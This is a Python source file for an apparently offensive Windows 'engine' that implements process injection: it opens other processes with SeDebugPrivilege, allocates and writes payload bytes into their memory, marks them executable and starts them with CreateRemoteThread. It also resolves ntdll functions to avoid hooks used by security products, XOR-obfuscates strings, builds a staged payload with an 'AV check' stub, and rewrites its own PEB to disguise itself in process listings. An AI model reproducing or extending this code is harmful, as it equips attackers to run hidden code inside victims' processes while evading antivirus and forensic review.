import asyncio
import ctypes
import os
# on Windows we need wintypes and WINFUNCTYPE; on other OSes define
# a compatible alias to avoid ImportError.
if os.name == 'nt':
    from ctypes import wintypes, WINFUNCTYPE
else:
    # linux or others: wintypes may not exist, but we only use CFUNCTYPE
    wintypes = ctypes
    WINFUNCTYPE = ctypes.CFUNCTYPE
from typing import Dict, Any, Optional, List, Tuple
from core.interfaces import BaseEngine
from enum import IntEnum

# loader imported lazily to avoid circularity issues
try:
    from engines.windows.reflective_loader import ReflectiveLoader
except ImportError:
    ReflectiveLoader = None


class SyscallResolver:
    """Resolver that fetches system call stubs directly from ntdll.

    By keeping a handle to ntdll and automatically constructing callable
    prototypes, we avoid touching the kernel32 usermode hooks which are
    commonly intercepted by security products. Users of this class should
    request the desired prototype (return/arg types) and the resolver will
    cache the resulting function pointer.
    """

    def __init__(self):
        # load ntdll once and cache prototypes
        self._nt = ctypes.WinDLL("ntdll", use_last_error=True)
        self._cache: Dict[str, ctypes._CFuncPtr] = {}

    def get(self, name: str, restype, argtypes):
        """Return a callable matching the given signature.

        The function is looked up in ntdll and wrapped with the specified
        return/argument types. Subsequent calls return the cached object.
        """
        if name in self._cache:
            return self._cache[name]

        try:
            addr = getattr(self._nt, name)
        except AttributeError:
            raise TriadEngineError(f"Syscall {name} not found in ntdll")

        prototype = WINFUNCTYPE(restype, *argtypes)
        func = prototype((name, self._nt))
        self._cache[name] = func
        return func




class TriadEngineError(Exception):
    # note: base engine error
    def __init__(self, message: str, error_code: Optional[int] = None):
        super().__init__(message)
        self.error_code = error_code


class TriadMemoryError(TriadEngineError):
    pass


class TriadProcessError(TriadEngineError):
    pass


class TriadTokenError(TriadEngineError):
    pass


class ProcessAccess(IntEnum):
    TERMINATE = 0x0001
    CREATE_THREAD = 0x0002
    VM_OPERATION = 0x0008
    VM_READ = 0x0010
    VM_WRITE = 0x0020
    QUERY_LIMITED_INFORMATION = 0x1000
    ALL = 0x001F0FFF


class TokenAccess(IntEnum):
    ASSIGN_PRIMARY = 0x0001
    DUPLICATE = 0x0002
    IMPERSONATE = 0x0004
    QUERY = 0x0008
    ADJUST_PRIVILEGES = 0x0020
    ALL = 0xF01FF


class MemFlags(IntEnum):
    COMMIT = 0x00001000
    RESERVE = 0x00002000
    DECOMMIT = 0x00004000
    RELEASE = 0x00008000
    RESET = 0x00080000


class WinProtect(IntEnum):
    NOACCESS = 0x01
    READONLY = 0x02
    READWRITE = 0x04
    WRITECOPY = 0x08
    EXECUTE = 0x10
    EXECUTE_READ = 0x20
    EXECUTE_READWRITE = 0x40
    EXECUTE_WRITECOPY = 0x80


class WaitResult(IntEnum):
    OBJECT_0 = 0x00000000
    TIMEOUT = 0x00000102


class TokenManager:
    # note: minimal token helper
    def __init__(self, k32: ctypes.CDLL, advapi32: ctypes.CDLL):
        self.k32 = k32
        self.advapi = advapi32

    def get_current_token(self) -> wintypes.HANDLE:
        token = wintypes.HANDLE()
        current_proc = self.k32.GetCurrentProcess()

        res = self.advapi.OpenProcessToken(
            current_proc,
            TokenAccess.QUERY | TokenAccess.ADJUST_PRIVILEGES,
            ctypes.byref(token),
        )

        if not res:
            error_code = ctypes.get_last_error()
            raise TriadTokenError("OpenProcessToken failed", error_code=error_code)

        return token

    def duplicate_token(self, source_token: wintypes.HANDLE) -> wintypes.HANDLE:
        dup_token = wintypes.HANDLE()

        res = self.advapi.DuplicateTokenEx(
            source_token,
            TokenAccess.ALL,
            None,
            2,
            1,
            ctypes.byref(dup_token),
        )

        if not res:
            error_code = ctypes.get_last_error()
            raise TriadTokenError("DuplicateTokenEx failed", error_code=error_code)

        return dup_token

    def close_handle(self, handle: wintypes.HANDLE) -> None:
        if handle and getattr(handle, "value", None):
            res = self.k32.CloseHandle(handle)
            if not res:
                error_code = ctypes.get_last_error()
                raise TriadEngineError("CloseHandle failed", error_code=error_code)


class WinEngine(BaseEngine):
    # note: kernel32 wrappers with typed prototypes

    def __init__(self) -> None:
        self.k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        self.psapi = ctypes.WinDLL("psapi", use_last_error=True)
        self.advapi = ctypes.WinDLL("advapi32", use_last_error=True)

        self.OpenProcess = WINFUNCTYPE(
            wintypes.HANDLE, wintypes.DWORD, wintypes.BOOL, wintypes.DWORD
        )(("OpenProcess", self.k32))
        self.VirtualAllocEx = WINFUNCTYPE(
            wintypes.LPVOID,
            wintypes.HANDLE,
            wintypes.LPVOID,
            ctypes.c_size_t,
            wintypes.DWORD,
            wintypes.DWORD,
        )(("VirtualAllocEx", self.k32))
        self.WriteProcessMemory = WINFUNCTYPE(
            wintypes.BOOL,
            wintypes.HANDLE,
            wintypes.LPVOID,
            ctypes.c_void_p,
            ctypes.c_size_t,
            ctypes.POINTER(ctypes.c_size_t),
        )(("WriteProcessMemory", self.k32))
        self.ReadProcessMemory = WINFUNCTYPE(
            wintypes.BOOL,
            wintypes.HANDLE,
            wintypes.LPVOID,
            ctypes.c_void_p,
            ctypes.c_size_t,
            ctypes.POINTER(ctypes.c_size_t),
        )(("ReadProcessMemory", self.k32))
        self.VirtualProtectEx = WINFUNCTYPE(
            wintypes.BOOL,
            wintypes.HANDLE,
            wintypes.LPVOID,
            ctypes.c_size_t,
            wintypes.DWORD,
            ctypes.POINTER(wintypes.DWORD),
        )(("VirtualProtectEx", self.k32))
        self.CreateRemoteThread = WINFUNCTYPE(
            wintypes.HANDLE,
            wintypes.HANDLE,
            wintypes.LPVOID,
            ctypes.c_size_t,
            wintypes.LPVOID,
            wintypes.LPVOID,
            wintypes.DWORD,
            ctypes.POINTER(wintypes.DWORD),
        )(("CreateRemoteThread", self.k32))
        self.CloseHandle = WINFUNCTYPE(wintypes.BOOL, wintypes.HANDLE)(
            ("CloseHandle", self.k32)
        )
        self.EnumProcesses = WINFUNCTYPE(
            wintypes.BOOL,
            ctypes.POINTER(wintypes.DWORD),
            wintypes.DWORD,
            ctypes.POINTER(wintypes.DWORD),
        )(("EnumProcesses", self.psapi))
        # note: alias v_qry provided for aesthetic mapping
        self.VirtualQueryEx = WINFUNCTYPE(
            ctypes.c_size_t,
            wintypes.HANDLE,
            wintypes.LPCVOID,
            ctypes.c_void_p,
            ctypes.c_size_t,
        )(("VirtualQueryEx", self.k32))
        self.v_qry = self.VirtualQueryEx

        self.GetCurrentProcess = WINFUNCTYPE(wintypes.HANDLE)(("GetCurrentProcess", self.k32))
        self.WaitForSingleObject = WINFUNCTYPE(
            wintypes.DWORD, wintypes.HANDLE, wintypes.DWORD
        )(("WaitForSingleObject", self.k32))
        self.GetProcessImageFileNameA = WINFUNCTYPE(
            wintypes.DWORD, wintypes.HANDLE, ctypes.c_char_p, wintypes.DWORD
        )(("GetProcessImageFileNameA", self.psapi))

        self.token_mgr = TokenManager(self.k32, self.advapi)

        # dynamic syscall resolver for ntdll functions
        self.syscall = SyscallResolver()
        # attempt to bind low-level Nt* interfaces; errors propagate but are
        # handled by resolver to fall back later if needed

        # expose a reflective loader helper if available
        if ReflectiveLoader is not None:
            self.reflective = ReflectiveLoader(self)
        try:
            self.NtReadVirtualMemory = self.syscall.get(
                "NtReadVirtualMemory",
                wintypes.DWORD,
                [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)],
            )
            self.NtWriteVirtualMemory = self.syscall.get(
                "NtWriteVirtualMemory",
                wintypes.DWORD,
                [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)],
            )
            self.NtAllocateVirtualMemory = self.syscall.get(
                "NtAllocateVirtualMemory",
                wintypes.DWORD,
                [wintypes.HANDLE, ctypes.POINTER(ctypes.c_void_p), wintypes.ULONG_PTR, ctypes.POINTER(ctypes.c_size_t), wintypes.DWORD, wintypes.DWORD],
            )
            self.NtProtectVirtualMemory = self.syscall.get(
                "NtProtectVirtualMemory",
                wintypes.DWORD,
                [wintypes.HANDLE, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_size_t), wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)],
            )
            # also provide NtOpenProcess for future use; use generic c_void_p for
            # attributes/ids since we will only call it with NULL/IDs.
            self.NtOpenProcess = self.syscall.get(
                "NtOpenProcess",
                wintypes.DWORD,
                [ctypes.POINTER(wintypes.HANDLE), wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p],
            )
            # query information API used for PEB location
            self.NtQueryInformationProcess = self.syscall.get(
                "NtQueryInformationProcess",
                wintypes.DWORD,
                [wintypes.HANDLE, wintypes.DWORD, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)],
            )
        except Exception:
            # resolver will raise if any function not found; we simply ignore
            # because we can still fall back on kernel32 equivalents
            pass


        class MEMORY_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("BaseAddress", ctypes.c_void_p),
                ("AllocationBase", ctypes.c_void_p),
                ("AllocationProtect", wintypes.DWORD),
                ("RegionSize", ctypes.c_size_t),
                ("State", wintypes.DWORD),
                ("Protect", wintypes.DWORD),
                ("Type", wintypes.DWORD),
            ]

        self._MBI = MEMORY_BASIC_INFORMATION

        # simple heap obfuscator key (XOR) for sensitive strings
        self._heap_key = 0x5A

    # --- heap obfuscation helpers ------------------------------------------------
    def obfuscate(self, text: str) -> bytes:
        """Return XOR‑encoded bytes for a string.
        The result can be stored in heap memory safely until needed.
        """
        return bytes([c ^ self._heap_key for c in text.encode("utf-8")])

    def deobfuscate(self, data: bytes) -> str:
        """Reverse the obfuscation and return plain text."""
        return bytes([c ^ self._heap_key for c in data]).decode("utf-8")

    # --- PEB manipulation --------------------------------------------------------
    def _get_peb_address(self) -> int:
        # structure for PROCESS_BASIC_INFORMATION
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("ExitStatus", ctypes.c_void_p),
                ("PebBaseAddress", ctypes.c_void_p),
                ("AffinityMask", ctypes.c_void_p),
                ("BasePriority", ctypes.c_void_p),
                ("UniqueProcessId", ctypes.c_void_p),
                ("InheritedFromUniqueProcessId", ctypes.c_void_p),
            ]
        pbi = PROCESS_BASIC_INFORMATION()
        retlen = ctypes.c_ulong()
        status = self.NtQueryInformationProcess(
            self.GetCurrentProcess(),
            0,  # ProcessBasicInformation
            ctypes.byref(pbi),
            ctypes.sizeof(pbi),
            ctypes.byref(retlen),
        )
        if status != 0:
            raise TriadEngineError("NtQueryInformationProcess failed", error_code=status)
        return pbi.PebBaseAddress

    def mask_peb(self, new_cmdline: str, new_image: str) -> None:
        """Overwrite PEB fields so the process appears to be another service.

        This method allocates new buffers in our own address space and
        updates the UNICODE_STRING entries for ImagePathName and CommandLine
        inside the ProcessParameters structure. Useful for hiding the
        Python host in process listings.
        """
        # internal helper definitions
        class UNICODE_STRING(ctypes.Structure):
            _fields_ = [
                ("Length", wintypes.USHORT),
                ("MaximumLength", wintypes.USHORT),
                ("Buffer", wintypes.LPWSTR),
            ]

        # read pointer to process parameters from PEB
        hproc = self.GetCurrentProcess()
        peb = self._get_peb_address()
        proc_params_ptr = ctypes.c_void_p()
        bytes_read = ctypes.c_size_t()
        # offset 0x20 for ProcessParameters on x64
        self.ReadProcessMemory(hproc, peb + 0x20, ctypes.byref(proc_params_ptr), ctypes.sizeof(proc_params_ptr), ctypes.byref(bytes_read))
        if not proc_params_ptr.value:
            raise TriadEngineError("Unable to locate ProcessParameters")

        params = proc_params_ptr.value

        # helper to replace a unicode string field at given offset
        def _replace(offset: int, text: str):
            us = UNICODE_STRING()
            self.ReadProcessMemory(hproc, params + offset, ctypes.byref(us), ctypes.sizeof(us), ctypes.byref(bytes_read))
            # allocate new buffer in our process
            buf = ctypes.create_unicode_buffer(text + "\x00")
            self.WriteProcessMemory(hproc, us.Buffer, ctypes.byref(buf), ctypes.sizeof(buf), ctypes.byref(bytes_read))
            us.Length = len(text) * 2
            # leave MaximumLength unchanged (it encodes the previous size)
            self.WriteProcessMemory(hproc, params + offset, ctypes.byref(us), ctypes.sizeof(us), ctypes.byref(bytes_read))

        # offsets derived from PEB/RTL_USER_PROCESS_PARAMETERS layout on x64
        IMAGE_OFFSET = 0x60
        CMD_OFFSET = 0x70
        _replace(IMAGE_OFFSET, new_image)
        _replace(CMD_OFFSET, new_cmdline)

    # --- memory utilities continued ------------------------------------------------

    async def get_system_context(self) -> Dict[str, Any]:
        return {"os": "Windows", "arch": "x64"}

    async def enumerate_processes(self) -> List[int]:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._enum_processes_sync)

    def _enum_processes_sync(self) -> List[int]:
        cb_needed = wintypes.DWORD()
        process_ids = (wintypes.DWORD * 2048)()

        if not self.EnumProcesses(
            ctypes.cast(process_ids, ctypes.POINTER(wintypes.DWORD)),
            ctypes.sizeof(process_ids),
            ctypes.byref(cb_needed),
        ):
            error_code = ctypes.get_last_error()
            raise TriadProcessError("EnumProcesses failed", error_code=error_code)

        count = cb_needed.value // ctypes.sizeof(wintypes.DWORD)
        return [process_ids[i] for i in range(count)]

    def _get_process_name_sync(self, pid: int) -> Optional[str]:
        try:
            hproc = self.OpenProcess(int(ProcessAccess.QUERY_LIMITED_INFORMATION), False, pid)
            if not hproc:
                return None

            buf = ctypes.create_string_buffer(260)
            res = self.GetProcessImageFileNameA(hproc, buf, 260)
            try:
                self.CloseHandle(hproc)
            except Exception:
                pass

            if not res:
                return None

            return buf.value.decode("utf-8", errors="ignore")
        except Exception:
            return None

    async def get_process_name(self, pid: int) -> Optional[str]:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._get_process_name_sync, pid)

    def _wait_for_handle_sync(self, handle: int, timeout_ms: int) -> bool:
        res = self.WaitForSingleObject(handle, timeout_ms)
        return res == int(WaitResult.OBJECT_0)

    async def wait_for_handle(self, handle: int, timeout_ms: int = 5000) -> bool:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, self._wait_for_handle_sync, handle, timeout_ms
        )

    async def escalate_token_privileges(self) -> Optional[wintypes.HANDLE]:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._escalate_sync)

    def _escalate_sync(self) -> Optional[wintypes.HANDLE]:
        try:
            token = self.token_mgr.get_current_token()

            luid = (wintypes.DWORD * 2)()

            res = self.advapi.LookupPrivilegeValueA(None, b"SeDebugPrivilege", ctypes.byref(luid))
            if not res:
                error_code = ctypes.get_last_error()
                raise TriadTokenError("LookupPrivilegeValueA failed", error_code=error_code)

            token_privs = (ctypes.c_char * 40)()

            res = self.advapi.AdjustTokenPrivileges(
                token, False, ctypes.byref(token_privs), len(token_privs), None, None
            )

            if not res:
                error_code = ctypes.get_last_error()
                self.token_mgr.close_handle(token)
                raise TriadTokenError("AdjustTokenPrivileges failed", error_code=error_code)

            return token
        except TriadTokenError:
            return None

    async def open_process(self, pid: int) -> wintypes.HANDLE:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._open_process_sync, pid)

    def _open_process_sync(self, pid: int) -> wintypes.HANDLE:
        desired_access = (
            ProcessAccess.QUERY_LIMITED_INFORMATION
            | ProcessAccess.VM_OPERATION
            | ProcessAccess.VM_READ
            | ProcessAccess.VM_WRITE
            | ProcessAccess.CREATE_THREAD
        )

        # try using ntdll syscall stub first (if resolver bound it)
        if hasattr(self, "NtOpenProcess"):
            # NtOpenProcess signature: (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID)
            hproc = wintypes.HANDLE()
            # OBJECT_ATTRIBUTES and CLIENT_ID structure can be NULL/zeroed for simple open
            status = self.NtOpenProcess(ctypes.byref(hproc), desired_access, None, ctypes.byref(wintypes.DWORD(pid)))
            if status == 0 and hproc:
                return hproc
            # on failure fall through to kernel32
        hproc = self.OpenProcess(int(desired_access), False, pid)
        if not hproc:
            error_code = ctypes.get_last_error()
            raise TriadProcessError("OpenProcess failed", error_code=error_code)

        return hproc

    async def allocate_memory(self, hproc: wintypes.HANDLE, size: int) -> int:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._allocate_memory_sync, hproc, size)

    def _allocate_memory_sync(self, hproc: wintypes.HANDLE, size: int) -> int:
        # prefer direct syscall via NtAllocateVirtualMemory
        if hasattr(self, "NtAllocateVirtualMemory"):
            base_addr = ctypes.c_void_p(0)
            region_size = ctypes.c_size_t(size)
            status = self.NtAllocateVirtualMemory(
                hproc,
                ctypes.byref(base_addr),
                0,
                ctypes.byref(region_size),
                int(MemFlags.COMMIT | MemFlags.RESERVE),
                int(WinProtect.READWRITE),
            )
            if status == 0 and base_addr.value:
                return base_addr.value
            # fall back if syscall failed
        addr = self.VirtualAllocEx(
            hproc,
            None,
            size,
            int(MemFlags.COMMIT | MemFlags.RESERVE),
            int(WinProtect.READWRITE),
        )

        if not addr:
            error_code = ctypes.get_last_error()
            raise TriadMemoryError("VirtualAllocEx failed", error_code=error_code)

        return addr

    async def write_memory(self, hproc: wintypes.HANDLE, addr: int, data: bytes) -> bool:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._write_memory_sync, hproc, addr, data)

    def _write_memory_sync(self, hproc: wintypes.HANDLE, addr: int, data: bytes) -> bool:
        written = ctypes.c_size_t(0)

        if hasattr(self, "NtWriteVirtualMemory"):
            status = self.NtWriteVirtualMemory(hproc, ctypes.c_void_p(addr), data, len(data), ctypes.byref(written))
            if status == 0 and written.value == len(data):
                return True
            # fall through to kernel32
        res = self.WriteProcessMemory(hproc, addr, data, len(data), ctypes.byref(written))
        if not res or written.value != len(data):
            error_code = ctypes.get_last_error()
            raise TriadMemoryError("WriteProcessMemory incomplete", error_code=error_code)

        return True

    async def read_memory(self, hproc: wintypes.HANDLE, addr: int, size: int) -> bytes:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._read_memory_sync, hproc, addr, size)

    def _read_memory_sync(self, hproc: wintypes.HANDLE, addr: int, size: int) -> bytes:
        buf = ctypes.create_string_buffer(size)
        read = ctypes.c_size_t(0)

        if hasattr(self, "NtReadVirtualMemory"):
            status = self.NtReadVirtualMemory(hproc, ctypes.c_void_p(addr), buf, size, ctypes.byref(read))
            if status == 0 and read.value > 0:
                return buf.raw[: read.value]
            # fall back to kernel32
        res = self.ReadProcessMemory(hproc, addr, buf, size, ctypes.byref(read))
        if not res or read.value == 0:
            error_code = ctypes.get_last_error()
            raise TriadMemoryError("ReadProcessMemory failed", error_code=error_code)

        return buf.raw[: read.value]

    async def iterate_memory_regions(self, hproc: wintypes.HANDLE):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._iterate_memory_regions_sync, hproc)

    def _iterate_memory_regions_sync(self, hproc: wintypes.HANDLE):
        # note: walk virtual address space
        regions = []
        addr = 0
        mbi = self._MBI()
        # try v_qry first
        res = self.v_qry(hproc, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi))
        if res:
            # TODO: check alignment
            while True:
                mbi = self._MBI()
                res = self.v_qry(hproc, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi))
                if not res:
                    break
                base = mbi.BaseAddress
                size = mbi.RegionSize
                state = mbi.State
                protect = mbi.Protect
                if state == int(MemFlags.COMMIT):
                    regions.append((base, size, protect, state))
                try:
                    addr = int(base) + int(size)
                except Exception:
                    break
            return regions

        # fallback probe
        max_address = 0x7FFFFFFF
        step = 0x10000
        max_regions = 10000
        addr = 0
        scanned = 0
        consecutive_failures = 0
        while addr < max_address and scanned < max_regions:
            try:
                try:
                    data = self._read_memory_sync(hproc, addr, 1)
                    regions.append((addr, step, 0, int(MemFlags.COMMIT)))
                    scanned += 1
                    consecutive_failures = 0
                except TriadMemoryError:
                    consecutive_failures += 1
                    if consecutive_failures > 1000:
                        break
            except Exception:
                pass
            addr += step

        return regions

    async def srch_rpl(self, hproc: wintypes.HANDLE, target: bytes, replacement: bytes) -> Tuple[int, int]:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._srch_rpl_sync, hproc, target, replacement)

    def _srch_rpl_sync(self, hproc: wintypes.HANDLE, target: bytes, replacement: bytes) -> Tuple[int, int]:
        if len(target) != len(replacement):
            raise TriadMemoryError("target and replacement must be same length")

        regions = self._iterate_memory_regions_sync(hproc)

        regions_scanned = 0

        for base, size, protect, state in regions:
            regions_scanned += 1
            if protect & int(WinProtect.NOACCESS):
                continue

            offset = 0
            chunk_size = 0x1000
            while offset < size:
                to_read = min(chunk_size, size - offset)
                addr = int(base) + offset
                try:
                    data = self._read_memory_sync(hproc, addr, to_read)
                except TriadMemoryError:
                    offset += to_read
                    continue

                idx = data.find(target)
                if idx != -1:
                    found_addr = addr + idx
                    self._write_memory_sync(hproc, found_addr, replacement)
                    return found_addr, regions_scanned

                offset += to_read

        raise TriadMemoryError(f"pattern not found in process memory (regions_scanned={len(regions)})")

    async def protect_memory(self, hproc: wintypes.HANDLE, addr: int, size: int, new_protect: int) -> int:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, self._protect_memory_sync, hproc, addr, size, new_protect
        )

    def _protect_memory_sync(self, hproc: wintypes.HANDLE, addr: int, size: int, new_protect: int) -> int:
        old_protect = wintypes.DWORD(0)

        res = self.VirtualProtectEx(hproc, addr, size, int(new_protect), ctypes.byref(old_protect))
        if not res:
            error_code = ctypes.get_last_error()
            raise TriadMemoryError("VirtualProtectEx failed", error_code=error_code)

        return old_protect.value

    async def create_remote_thread(self, hproc: wintypes.HANDLE, entry_point: int) -> wintypes.HANDLE:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._create_remote_thread_sync, hproc, entry_point)

    def _create_remote_thread_sync(self, hproc: wintypes.HANDLE, entry_point: int) -> wintypes.HANDLE:
        hthread = self.CreateRemoteThread(hproc, None, 0, entry_point, None, 0, None)
        if not hthread:
            error_code = ctypes.get_last_error()
            raise TriadProcessError("CreateRemoteThread failed", error_code=error_code)

        return hthread

    def build_staged_payload(self, full_payload: bytes) -> bytes:
        """Construct a two-stage payload.

        Stage 1 is a tiny stub that would perform an AV/environment check and then
        allocate memory in the target process for stage 2, copying `full_payload`
        into it before jumping to it. Here we simulate the behaviour by simply
        prepending a pseudo‑stub. In a real engine this would be shellcode.
        """
        stub = b"\x90" * 16  # NOP sled representing the AV check
        # note: stub would normally include logic to verify AV and fetch stage2
        return stub + full_payload

    async def inject_memory(self, pid: int, payload: bytes) -> Dict[str, Any]:
        hproc: Optional[wintypes.HANDLE] = None
        hthread: Optional[wintypes.HANDLE] = None
        addr: Optional[int] = None

        try:
            hproc = await self.open_process(pid)

            addr = await self.allocate_memory(hproc, len(payload))

            await self.write_memory(hproc, addr, payload)

            old_protect = await self.protect_memory(hproc, addr, len(payload), WinProtect.EXECUTE_READ)

            hthread = await self.create_remote_thread(hproc, addr)

            return {
                "success": True,
                "pid": pid,
                "injection_addr": hex(addr) if addr else None,
                "payload_size": len(payload),
                "old_protection": hex(old_protect) if old_protect else None,
                "thread_handle": int(hthread) if hthread else None,
            }

        except TriadEngineError as e:
            return {
                "success": False,
                "pid": pid,
                "error": str(e),
                "error_type": type(e).__name__,
            }

        finally:
            if hthread:
                try:
                    self.token_mgr.close_handle(hthread)
                except TriadEngineError:
                    pass

            if hproc:
                try:
                    self.token_mgr.close_handle(hproc)
                except TriadEngineError:
                    pass

    def cleanup(self) -> None:
        # note: no-op cleanup
        return None
